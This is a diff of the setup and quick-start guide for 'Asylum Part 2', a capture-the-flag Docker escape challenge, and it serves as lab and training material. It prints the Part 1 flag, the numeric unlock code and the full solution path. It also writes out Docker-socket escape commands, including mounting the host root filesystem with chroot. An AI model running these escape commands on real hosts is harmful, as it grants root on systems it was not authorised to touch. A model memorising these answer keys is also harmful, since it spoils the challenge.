@@ -1,4 +1,12 @@
-# Quick Start Guide
+# Quick Start Guide - Part 2: Docker Escape Challenge
+
+## Challenge Context
+
+This is **Part 2** of the Asylum challenge. Players start with shell access as `svc_vidops` user from Part 1. You need to:
+1. Access the privileged Docker container
+2. Perform Docker escape to get the numeric unlock code
+3. Authenticate to SCADA terminal with Part 1 flag
+4. Unlock the gate with the numeric code
 
 ## One-Command Setup
 
@@ -7,16 +15,15 @@
 ```
 
 This will:
-1. Create the flag file on the host
-2. Build the Docker image
-3. Start the privileged container
-4. Provide connection instructions
+1. Build the Docker image (unlock code is created inside container)
+2. Start the privileged container
+3. Provide connection instructions
 
 ## Manual Setup
 
-### 1. Create Flag File
+### 1. Create Unlock Code File
 ```bash
-# Flag is created inside the container during build
+# Unlock code is created inside the container during build at /root/.asylum/unlock_code
 ```
 
 ### 2. Build and Run
@@ -29,6 +36,10 @@ docker compose up -d --build
 nc localhost 9001
 ```
 
+**Authentication Required:**
+- When prompted, enter Part 1 flag: `THM{Y0u_h4ve_b3en_j3stered_739138}`
+- Only after authentication will you have access to SCADA commands
+
 ### 4. Access Container Shell (for escape)
 ```bash
 docker exec -it asylum_gate_control /bin/bash
@@ -36,15 +47,14 @@ docker exec -it asylum_gate_control /bin/bash
 
 ## Challenge Flow
 
-1. **Connect to SCADA terminal:** `nc localhost 9001`
-2. **Explore the interface:** Use `help`, `status`, `info` commands
-3. **Access container:** `docker exec -it asylum_gate_control /bin/bash`
-4. **Find the flag in the container:** 
-   - Use `sudo` with password `gatekeeper123` to access root directories
-   - Explore hidden directories (try `/root/.asylum/`)
-   - Use `find` or `grep` to search for files containing "THM{"
-5. **Read the flag:** Once found, read the flag file
-6. **Unlock the gate:** Connect to SCADA terminal and use `unlock /path/to/flag` or `unlock THM{...}`
+1. **You already have shell as `svc_vidops` (from Part 1)**
+2. **Access container:** `docker exec -it asylum_gate_control /bin/bash`
+3. **Perform Docker escape to get unlock code:**
+   - `sudo docker -H unix:///var/run/docker.sock exec -u root asylum_gate_control cat /root/.asylum/unlock_code`
+   - Output: `739184627`
+4. **Connect to SCADA terminal:** `nc localhost 9001`
+5. **Authenticate:** Enter Part 1 flag: `THM{Y0u_h4ve_b3en_j3stered_739138}`
+6. **Unlock the gate:** Use `unlock 739184627`
 
 ## Useful Commands Inside Container
 
@@ -59,7 +69,7 @@ ls -la /var/run/docker.sock
 cat /proc/self/status | grep CapEff
 
 # Use sudo to access root directory
-sudo cat /root/.asylum/flag
+sudo cat /root/.asylum/unlock_code
 
 # Use Docker socket to escape
 docker -H unix:///var/run/docker.sock run -it --rm -v /:/host ubuntu chroot /host bash
@@ -72,13 +82,14 @@ After setup, verify everything works:
 # Check container is running
 docker ps | grep asylum_gate_control
 
-# Test SCADA connection
+# Test SCADA connection (with authentication)
 nc localhost 9001 << EOF
+THM{Y0u_h4ve_b3en_j3stered_739138}
 help
 status
 exit
 EOF
 
-# Verify flag exists in container
-docker exec asylum_gate_control sudo cat /root/.asylum/flag
+# Verify unlock code exists in container
+docker exec asylum_gate_control sudo cat /root/.asylum/unlock_code
 ```
